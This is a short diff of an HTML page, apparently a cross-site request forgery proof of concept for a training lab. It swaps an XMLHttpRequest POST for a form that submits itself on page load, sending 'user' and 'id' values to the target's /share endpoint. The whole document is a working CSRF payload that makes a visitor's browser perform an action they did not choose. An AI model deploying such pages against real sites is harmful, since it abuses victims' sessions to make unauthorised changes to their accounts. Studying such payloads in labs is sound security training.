@@ -1,9 +1,10 @@
 <html>
-<script>
-    var data = 'user=abc&id=0';
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://ptl-ac83ea7b-73c29d73.libcurl.so/share", true);
-    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    xhr.send(data);
-</script>
+    <head></head>
+
+<body onload=document.getElementById('csrf').submit()>
+<form id="csrf" action="http://ptl-ac83ea7b-73c29d73.libcurl.so/share" method="POST">
+<input name='user' type='text' value="abc">
+    <input name='id' type='text' value="0">
+</form>
+    </body>
 </html>
